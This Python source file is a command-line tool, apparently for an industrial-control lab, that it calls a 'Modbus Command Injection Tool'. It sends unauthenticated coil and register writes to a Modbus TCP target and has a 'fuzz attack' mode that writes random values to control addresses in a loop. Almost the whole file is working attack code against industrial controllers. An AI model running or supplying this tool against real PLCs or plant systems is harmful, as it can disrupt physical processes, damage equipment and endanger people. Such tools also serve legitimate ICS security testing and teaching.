import sys
import argparse
import random
import time
import inspect
from pymodbus.client import ModbusTcpClient

def get_unit_kwargs(method, unit_id):
    """Dynamically determine the right unit argument (slave/unit/device_id) based on PyModbus version."""
    sig = inspect.signature(method)
    if 'device_id' in sig.parameters:
        return {'device_id': unit_id}
    elif 'slave' in sig.parameters:
        return {'slave': unit_id}
    else:
        return {'unit': unit_id}

def write_coil(target_ip, target_port, unit_id, address, value):
    """Write to a Single Coil (Function 05)."""
    client = ModbusTcpClient(target_ip, port=target_port)
    if client.connect():
        print(f"[*] Connected to {target_ip}:{target_port} (Unit {unit_id})")
        print(f"[*] Writing Coil {address} = {value}")
        try:
            kwargs = get_unit_kwargs(client.write_coil, unit_id)
            rq = client.write_coil(address, bool(value), **kwargs)
            if rq.isError():
                print(f"[-] Error writing coil: {rq}")
            else:
                print(f"[+] Write Successful!")
        except Exception as e:
            print(f"[-] Exception: {e}")
        client.close()
    else:
        print(f"[-] Failed to connect to {target_ip}:{target_port}")

def write_register(target_ip, target_port, unit_id, address, value):
    """Write to a Single Register (Function 06)."""
    client = ModbusTcpClient(target_ip, port=target_port)
    if client.connect():
        print(f"[*] Connected to {target_ip}:{target_port} (Unit {unit_id})")
        print(f"[*] Writing Register {address} = {value}")
        try:
            kwargs = get_unit_kwargs(client.write_register, unit_id)
            rq = client.write_register(address, value, **kwargs)
            if rq.isError():
                print(f"[-] Error writing register: {rq}")
            else:
                print(f"[+] Write Successful!")
        except Exception as e:
            print(f"[-] Exception: {e}")
        client.close()
    else:
        print(f"[-] Failed to connect to {target_ip}:{target_port}")

def fuzz_attack(target_ip, target_port, unit_id, count):
    """Randomly write to coils and registers."""
    client = ModbusTcpClient(target_ip, port=target_port)
    if client.connect():
        print(f"[*] Starting Fuzzing Attack on {target_ip}:{target_port} (Unit {unit_id})")
        for i in range(count):
            try:
                # Randomly choose between Coil (05) and Register (06)
                if random.choice([True, False]):
                    addr = random.randint(0, 10)
                    val = random.choice([True, False])
                    print(f"    [{i+1}/{count}] Writing Coil {addr} = {val}")
                    kwargs = get_unit_kwargs(client.write_coil, unit_id)
                    client.write_coil(addr, val, **kwargs)
                else:
                    addr = random.randint(0, 10)
                    val = random.randint(0, 65535)
                    print(f"    [{i+1}/{count}] Writing Register {addr} = {val}")
                    kwargs = get_unit_kwargs(client.write_register, unit_id)
                    client.write_register(addr, val, **kwargs)
                time.sleep(0.1)
            except Exception as e:
                print(f"    [-] Error: {e}")
        client.close()
    else:
        print(f"[-] Failed to connect to {target_ip}:{target_port}")

if __name__ == "__main__":
    base_parser = argparse.ArgumentParser(add_help=False)
    base_parser.add_argument("--target", default="localhost", help="Target IP address")
    base_parser.add_argument("--port", type=int, default=5002, help="Target Port (default: 5002)")
    base_parser.add_argument("--unit", type=int, default=1, help="Modbus Unit ID (default: 1)")

    parser = argparse.ArgumentParser(description="Modbus Command Injection Tool", parents=[base_parser])
    subparsers = parser.add_subparsers(dest="command", help="Command to execute")
    
    # Write Coil Command
    coil_parser = subparsers.add_parser("write-coil", help="Write to a coil (Function 05)", parents=[base_parser])
    coil_parser.add_argument("address", type=int, help="Coil Address")
    coil_parser.add_argument("value", type=int, choices=[0, 1], help="Value (0 or 1)")
    
    # Write Register Command
    reg_parser = subparsers.add_parser("write-reg", help="Write to a register (Function 06)", parents=[base_parser])
    reg_parser.add_argument("address", type=int, help="Register Address")
    reg_parser.add_argument("value", type=int, help="Value (0-65535)")

    # Fuzz Command
    fuzz_parser = subparsers.add_parser("fuzz", help="Randomly write to coils/registers", parents=[base_parser])
    fuzz_parser.add_argument("--count", type=int, default=100, help="Number of random writes")

    args = parser.parse_args()

    if args.command == "write-coil":
        write_coil(args.target, args.port, args.unit, args.address, args.value)
    elif args.command == "write-reg":
        write_register(args.target, args.port, args.unit, args.address, args.value)
    elif args.command == "fuzz":
        fuzz_attack(args.target, args.port, args.unit, args.count)
    else:
        parser.print_help()
